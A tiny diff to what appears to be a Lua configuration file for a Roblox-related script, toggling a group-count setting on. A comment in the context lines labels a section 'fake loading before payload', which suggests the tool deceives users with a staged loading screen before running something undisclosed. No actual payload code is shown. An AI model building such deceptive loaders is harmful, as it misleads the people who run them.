@@ -50,7 +50,7 @@ return {
     group_ids = { 260140977, 633417839 },
     
     playercount_enabled = true,
-    groupcount_enabled = false,
+    groupcount_enabled = true,
 
     -- ═══════════════════════════════════════════════════════════════
     --  LOADING SCREEN MESSAGES (fake loading before payload)
